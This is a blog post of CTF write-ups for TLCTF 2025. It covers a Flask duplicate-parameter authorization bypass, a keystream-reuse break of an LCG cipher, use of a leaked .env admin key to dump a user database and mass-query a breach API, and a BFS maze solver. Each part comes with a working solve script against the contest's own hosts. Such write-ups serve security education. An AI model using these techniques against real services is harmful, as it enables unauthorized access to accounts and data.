---
layout: post
title: "TLCTF 2025 writeups"
date: 2025-12-20
tags: [ctf, challenge, reversing, web, crypto]
description: "writeups for tlctf 2025 organised by trustlab iitb."
---

## Secure API

The challenge presents a Flask API with a critical authorization bypass in the `/api/balance` endpoint. Examining the source code reveals the flaw at lines 107-115:

```python
target = request.args.get('username')
if target and target != auth_user:
    return jsonify({'error': 'unauthorized'}), 403

query_target = request.args.getlist('username')
if query_target:
    actual_target = query_target[-1]  # Uses LAST element
```

The vulnerability stems from inconsistent parameter handling. The authorization check uses `request.args.get('username')`, which returns only the **first value** when multiple parameters exist, while the actual database query uses `request.args.getlist('username')[-1]`, which retrieves the **last value**. By supplying `username` twice—first with our authenticated user and second with `admin`—we bypass the authorization check (which validates only the first parameter) while retrieving the admin's balance (using the last parameter).

```python
import requests

url = "https://tlctf2025-api.chals.io/"

data = {"username": "mewtwo", "password": "mewtwo"}

r = requests.post(url + "/api/register", json=data)
print(r.text)

r = requests.post(url + "/api/login", json=data)
token = r.json().get("token")

headers = {"Authorization": f"Bearer {token}"}
params = {"username": ["mewtwo", "admin"]}
r = requests.get(url + "/api/balance", params=params, headers=headers)
print(r.text)
```


## N00bRandomness

The challenge implements a flawed stream cipher using a Linear Congruential Generator (LCG)-based keystream:

```python
def _step(x, y, z):
    return (x * z + y) & 0xFF

def _mask_bytes(payload: bytes, x: int, y: int, seed: int) -> bytes:
    s = seed & 0xFF
    out = bytearray()
    for b in payload:
        s = _step(x, y, s)
        out.append(b ^ s)
    return bytes(out)
```

The cipher encrypts three messages (`msg1`, `msg2`, `flag`) using:

```
ciphertext = plaintext ⊕ keystream
```

All three ciphertexts reuse the same keystream derived from identical parameters `(A, C, SEED)`.

With `msg1` plaintext known, the keystream is trivially recovered. Since the flag uses the same keystream from the beginning, it can be decrypted by xor of `ct3` and` keystream`
Stream cipher keystream reuse enables a **known-plaintext attack**.
### Solution

```python
#!/usr/bin/env python3

PLAIN1_HEX = "57656c636f6d6520746f206d7920756c7472612073656375726520656e6372797074696f6e2073657276696365210a54686973206d6573736167652069732066756c6c79206b6e6f776e20746f20796f752e0a537572656c7920796f752063616e6e6f7420627265616b206d792074686973206369706865722e2e2e0a"
CIPH1_HEX  = "c6956bf53271f6a2dda7bf830cd45eb6b5d25666fea9a047ab1deffbcbc729f381240e99d35c80877b5e962db075816e4969e486804950e158bf4ade6c779b8c24dcab2f3db73d2d1ee67fda5a9492f5f44efd5538fee69ee018f6311044782bdf7e48c25d5ec1c7a8839f63ec343f9288b37705c49c8b378bb6c190cf"
CIPH3_HEX  = "e58272e5297fe7e4d2b1af9b2a901bb4b5ff0430bea29c5cea4babc197fb39d5823d5384c923c7bd7d40ce7ba8"

def lcg_step(a: int, c: int, s: int) -> int:
    return (a * s + c) & 0xFF

def verify_params(a: int, c: int, keystream: bytes) -> bool:
    s = keystream[0]
    for i in range(1, len(keystream)):
        s = lcg_step(a, c, s)
        if s != keystream[i]:
            return False
    return True

def generate_keystream(a: int, c: int, start: int, length: int) -> bytes:
    s = start
    out = []
    for _ in range(length):
        out.append(s)
        s = lcg_step(a, c, s)
    return bytes(out)

def brute_force_params(keystream: bytes) -> list:
    candidates = []
    for a in range(256):
        for c in range(256):
            if verify_params(a, c, keystream):
                candidates.append((a, c))
    return candidates

def main():
    plain1 = bytes.fromhex(PLAIN1_HEX)
    ciph1 = bytes.fromhex(CIPH1_HEX)
    ciph3 = bytes.fromhex(CIPH3_HEX)

    keystream = bytes([c ^ p for c, p in zip(ciph1, plain1)])
    print(f"Keystream recovered: {len(keystream)} bytes")
    print(f"First 32 bytes: {keystream[:32].hex()}\n")

    print("Brute-forcing LCG parameters (A, C)...")
    candidates = brute_force_params(keystream)
    print(f"Found {len(candidates)} valid parameter(s): {candidates}\n")

    if not candidates:
        print("No valid parameters found.")
        return

    for a, c in candidates:
        print(f"Testing A={a}, C={c}")
        flag_keystream = generate_keystream(a, c, keystream[0], len(ciph3))
        flag = bytes([ct ^ ks for ct, ks in zip(ciph3, flag_keystream)])
        
        try:
            flag_text = flag.decode('utf-8')
            print(f"Flag: {flag_text}\n")
            if flag_text.startswith("trustctf{") and flag_text.endswith("}"):
                print("Valid flag recovered!")
                return
        except UnicodeDecodeError:
            print(f"Failed to decode: {flag.hex()}\n")

if __name__ == "__main__":
    main()
```

### Flag
```
trustctf{y0u_d0nt_3v3n_n33d_2_b_sm4rt_4_th15}
```

## Breached

After extracting `dist.tar.gz`, we examine the provided files:

```
dist/
├── .env
├── server.py
├── static/
│   ├── index.html
│   ├── dashboard.html
│   ├── welcome.html
│   └── login.html
└── runtime_db.csv
```
### Examining the Dashboard

Looking at `dashboard.html`, we find an interesting hint:

```html
<h3>Admin tools</h3>
<p>If you are an admin you can request exports via the internal storage API. 
   Developers have been warned not to commit secrets.</p>
```
### Discovering the .env File

Checking the distributed files, we find a `.env` file containing sensitive credentials:

```bash
# .env
FLAG_SECRET=3HZ0jv5EuC4WHoJnxGKDxuoD9mCkxHMlJz3MucS6U40k7lLdqDqlF2pmeDRT2W5F
ADMIN_API_KEY=6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0
```

Examining `server.py` shows how these credentials are utilized:

```python
ADMIN_API_KEY = os.getenv('ADMIN_API_KEY')
FLAG_SECRET = os.getenv('FLAG_SECRET')

@app.route('/download_db')
def download_db():
    if not check_admin_key(request):
        return jsonify({'error': 'invalid api key'}), 401
    # ... downloads the full user database
    return send_file(db_path, as_attachment=True)

def token_for_email(email: str) -> str:
    hm = hmac.new(FLAG_SECRET.encode('utf-8'),
                  email.encode('utf-8'), hashlib.sha256)
    return hm.hexdigest()
```

1. `ADMIN_API_KEY` authenticates requests to `/download_db` endpoint
2. `FLAG_SECRET` is used to generate HMAC tokens for flag creation
3. Flag format: `trustctf{<first_12_chars_of_hmac>}`
### Attack flow

```
Leaked .env → Admin API Key → Download Database → Enumerate Emails → Find Pwned Email → Generate Flag
```
### Script

```python
#!/usr/bin/env python3
import csv, hmac, hashlib, requests
from concurrent.futures import ThreadPoolExecutor, as_completed

API_KEY = "6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0"
SECRET = "3HZ0jv5EuC4WHoJnxGKDxuoD9mCkxHMlJz3MucS6U40k7lLdqDqlF2pmeDRT2W5F"

def check_email(email):
    """Check if an email is marked as pwned in HIBC breach database"""
    try:
        r = requests.get(
            f"https://tlctf2025-hibc.chals.io/check_email?email={email}", 
            timeout=5
        )
        result = r.json()
        if result.get("pwned"):
            print(f"[!] Found pwned email: {email}")
            return email
    except Exception as e:
        pass
    return None

# Step 1: Download the user database using leaked admin API key
print("[*] Downloading database...")
r = requests.get(
    "https://tlctf2025-data-app.chals.io/download_db", 
    headers={"Authorization": f"Bearer {API_KEY}"}
)
open("db.csv", "wb").write(r.content)
print(f"[+] Database downloaded ({len(r.content)} bytes)")

# Step 2: Parse all emails from CSV
emails = [row['email'] for row in csv.DictReader(open("db.csv"))]
print(f"[*] Loaded {len(emails)} emails from database")
print(f"[*] Starting concurrent enumeration...")

# Step 3: Concurrently check each email against HIBC breach API
admin_found = None
with ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(check_email, email): email for email in emails}
    
    for future in as_completed(futures):
        result = future.result()
        if result:
            admin_found = result
            # Cancel remaining futures to save time
            for f in futures:
                f.cancel()
            break

# Step 4: Generate flag using HMAC-SHA256
if admin_found:
    token = hmac.new(SECRET.encode(), admin_found.encode(), hashlib.sha256).hexdigest()
    flag = f"trustctf{{{token[:12]}}}"
    print(f"\n[+] SUCCESS!")
    print(f"[+] Admin Email: {admin_found}")
    print(f"[+] HMAC Token: {token}")
    print(f"[+] FLAG: {flag}")
else:
    print("[!] No pwned email found in database")
```
### Flag
```
FLAG: trustctf{aefefb18de55}
```

## Gorey

Analyzing the given binary  shows that there is a maze that is not shown to the user. We can input where we want to go using the commands NORTH, SOUTH, WEST and EAST. But each command will step by 2 steps at a time. And the program checks for minimum number of steps to solve the maze and then decrypts the flag using functions like main_db, main_xb and main_ba.
![Files provided in the challenge](/assets/img/posts/tlctf-2025/Pasted.png)
I copied the maze from IDA.

The maze was encoded as a string where `1` represents walls, `0` represents walkable paths, `S` is the start position, and `E` is the end position. From analyzing the binary, I determined the maze dimensions were 71 characters wide and 70 rows tall.
### Solution Approach

The core challenge here was finding the shortest path through a maze where each move covers 2 cells instead of 1. This means when you move in a direction, you need to ensure both the intermediate cell and the destination cell are not walls - you can't jump over walls. This is essentially a constrained shortest path problem that's perfect for Breadth-First Search (BFS) since it guarantees finding the minimum number of moves.

I used ChatGPT to write the pathfinding script ([conversation link](https://chatgpt.com/share/691d7330-ccd0-8008-a343-498e9a13ac9f)). I provided it with the maze string from IDA, told it the dimensions (71×70), explained that each move goes 2 cells at a time and can't jump across walls. The resulting script implemented BFS where each state transition validates that both cells in the 2-step movement are valid (not walls and within bounds). AND IT WORKEDDD!!.
### Script

```python
from collections import deque

maze_raw = """
11111111111111111111111111111111111111111111111111111111111111111111111
1S100000100010000000100000100000000000000000101000000000000000101000001
10111010101010101110101111101110111111111110101011111011111110101011101
10000010101000101000100000001010000000000010001010100010100000101010001
11111110101111101011111011111011111111101011101010101110101111101010111
10001000100010001010001010000000001000101010101000100010001000101010001
10111011111110111010101010101111111010111010101110111010111010101011101
10100010001000101010101000101000100010000010001000001010100010100000101
10101110101011101010101110111010101111111111111011111010101110111111101
10001000100010001000101010100010001000000010000010100010001000000000001
10111011111110111111101010101111101011111010111110101111101111111111101
10000010000010000000001010101000101010001000100000100010001000100010001
11111111111010111111111010101010101010111111111010111011111010101110111
10000000001010100010000010100010101010001000000010001010000010100000001
10111111101010101010101110111110111010101010111111101010111110111111111
10001000001010101010100010000010001010101010001000001000001000100000001
10101011111010101010111011111011101010101011101111111111111010101111101
10101000000010101000001000001000101010101000100000000010000010101000101
10101111111010111111101011111110101011101110111111111010111111101010101
10100000100010000010001000000000100010000010001000000010001000001010001
10111110111111111010111111111111111110101110111011111011101011111011111
10100010000000001010100000001000000010101000100010000010101010001000001
10111011111110111010101111101011111010111011101110111110101010111111101
10001010000010000010101000101000101010000010001010000010100010100000001
11101010101011111110101110101110101011111110111011111010111110101111101
10101010101010000000100010101000101000000000100010001010001000100010001
10101010101010111111101010101011101111111111111010101010101010111010111
10001000101010100000101010001010000010000000000010100010100010001010001
10111011101110101110111010111010101110111011111010111110111110101011111
10001010001000101010000010000010101000001010001010000010100010101000001
11101010111011101011111111111110101011111010111011111010101010101111101
10001010000010001000100000000000100000100010100010001010101000101000001
10111110111111101011101111111111101111101110101110111010101111111011101
10000010000000001000000010001000101000101000001000100010100000001010001
11111011111111111011111010111010111010101110111011101110111111101011101
10001000100000001010001000100010000010100010001010001000100000101000101
10111110111110101110101111101111111110111011101010111011111011101110101
10000010001000100000100000100000001000001010000010100000000010000010101
11111011101011111111111110111111101111101010111110101111111110111110111
10001000101010000000100010100000100000100010001000100010000010100010001
10101110101010111110111010101110111110111011111011101110111010101011101
10100010101000000010100010001010100000101010000010001000100010001000101
10111010101111111010101111111010101111101010111110111011101111111010101
10100010100000001010100000100010001010000010000010001000100000000010101
10101110111111101110101110101011111010111111111011111010111111101111101
10100000001000101000101000101010000000100000001000001010100000001000001
10111111101010101011111011101010111111101011111111101010101111111011101
10001000101010101000001000001000000010001010000010001010100000001010001
10101110101010101011101111111111111010111110111010111110111111111010111
10100010000010101000100000000000100000100000101010001000100000000010001
10111011111111101111101111111010101111101111101011101011101111111111101
10001000001000001000101000001010101000101000001000001000101010000000001
11101111101011111010101011101110101010101110101111111110101010111111111
10001000101010000010101000100010101010100010101000000000101010000000101
10111110101010101110111110111010111010111010101010111011101010111110101
10000000100010100010001000100010001010000010100010100010001000100010001
11111110111111111011101011101111101011111111111110101110111011101011111
10000010100000000010100010100000100010001000000000101000100010001000001
10111010101111111110111110111110101110101011111111101011111110111111101
10001010100010000000100000100000100000100010000010001000000010000000101
11101010111011101111101110101111111111111110111010111111111011111110101
10001010001000100000101000101000001000000010001000100010001000000010101
10111011101010101110101011101011101110111111101111101011101111111010101
10001000101010100010001000101000100010100000100010001000000000101000101
10101111101110111011111110101110111010101110111010111011111110101111101
10101000100000100000100010100000100010000010000000100010001010001000101
10101010111111101111101010111111101111111111111111101110101011101010101
10101010000000100010001000100000100000000000000000101000101000001010101
10101011111110111010111111101011111111111111111110111011101111111010101
101000000000100000100000000010000000000000000000000000100000000000100E1
""".strip().splitlines()

H = len(maze_raw)
W = len(maze_raw[0])

maze = [list(row) for row in maze_raw]

# Locate start and end
for r in range(H):
    for c in range(W):
        if maze[r][c] == "S": start = (r, c)
        if maze[r][c] == "E": end = (r, c)

# Moves: 2 cells each step
dirs = {
    "NORTH": (-2, 0),
    "SOUTH": (2, 0),
    "WEST": (0, -2),
    "EAST": (0, 2),
}

def valid(r, c):
    return 0 <= r < H and 0 <= c < W and maze[r][c] != '1'

# BFS
queue = deque([start])
prev = {start: (None, None)}  # (previous cell, move name)

found = False

while queue:
    r, c = queue.popleft()
    if (r, c) == end:
        found = True
        break

    for move, (dr, dc) in dirs.items():
        nr, nc = r + dr, c + dc
        ir, ic = r + dr//2, c + dc//2  # intermediate cell

        if valid(nr, nc) and valid(ir, ic) and (nr, nc) not in prev:
            prev[(nr, nc)] = ((r, c), move)
            queue.append((nr, nc))

# Reconstruct
path_moves = []
cur = end
while prev[cur][0] is not None:
    cur, mv = prev[cur]
    path_moves.append(mv)

path_moves.reverse()

# Output
for m in path_moves:
    print(m)
```
### Flag

```
trustctf{y0uv3_35c4p3d_7h3_6l4d3_71m3_f0r_f4z3_7w0}
```